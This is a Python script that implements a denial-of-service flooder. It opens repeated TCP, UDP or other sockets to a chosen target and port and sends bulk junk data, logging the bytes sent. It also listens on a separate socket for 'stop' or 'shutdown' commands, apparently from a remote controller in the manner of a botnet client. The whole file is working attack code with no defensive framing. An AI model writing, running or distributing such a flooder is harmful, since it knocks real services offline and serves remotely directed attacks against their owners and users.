import socket, random, sys, time
from datetime import datetime

def timenow():
    return ("[" + datetime.now().strftime('%H:%M:%S') + "]")

print (timenow())
def DoS(Target,Port,Protocol,RandomPackets,Multiplier,s):
    Data="qwertyuiopasdfghjklzxcvbnm0123456789~!@#$%^&*()+=`;?.,<>\|{}[]"
    try:
        Target=Target
        Port=int(Port)
        Protocol=Protocol
        Rap=RandomPackets
        Multiplier=int(Multiplier)
    except Exception as ex:
        print("An incorrect value was given: " + str(ex))
        time.sleep(2)
        sys.exit()

    Adr=(Target,Port)
    s.settimeout(0.01)
    Total_data = 0
    run = True
    while run:
        try:
            data = s.recv(4096)
            if data.decode().lower() == "exit" or data.decode().lower() == "stop" or data.decode().lower() == "shutdown":
                run = False
            if data.decode() == "isconnectionactive":
                s.send(" ".encode())
        except Exception as ex:
            print(str(ex))
            if str(ex) == "[WinError 10054] An existing connection was forcibly closed by the remote host":
                run = False
        if Protocol.lower() =='tcp':
            Sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        elif Protocol.lower() =='udp':
            Sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        elif Protocol.lower() =='raw':
            Sock=socket.socket(socket.AF_UNIX,socket.SOCK_RAW)
        elif Protocol.lower() =='rdm':
            Sock=socket.socket(socket.AF_UNIX,socket.SOCK_RDM)
        elif Protocol.lower() =='seq':
            Sock=socket.socket(socket.AF_UNIX,socket.SOCK_SEQPACKET)
        success = False
        Sock.settimeout(1)
        try:
            Sock.connect(Adr)
            success = True
        except Exception as err:
            print (timenow() + " An Error Occured: " + str(err))
            print ("")
            time.sleep(2)
        if success:
            if Rap.lower()=='on':
                Bytes=(Data*random.randrange(16,64))
                BytesEnc=str.encode(Bytes*Multiplier)
            elif Rap.lower()=='off':
                Bytes=(Data*Multiplier)
                BytesEnc=str.encode(Bytes)
            elif Rap.lower()=='cus':
                Data="A"
                Bytes=(Data*(Multiplier-33))
                BytesEnc=str.encode(Bytes)
            Sock.sendall(BytesEnc)

            Total_data = Total_data + sys.getsizeof(BytesEnc)
            print(timenow() + ' Flooding {0} in port {1} with {2} bytes of data  |  Sent {3} bytes in total to {0} in port {1}'.format(Target, Port, sys.getsizeof(BytesEnc), Total_data))
            if socket.error:
                try:
                    Sock.shutdown(socket.SHUT_RDWR)
                except Exception as err:
                    print (timenow() + " An Error Occured: " + str(err))
                    print ("")
                    time.sleep(1)
                Sock.close
                del Sock
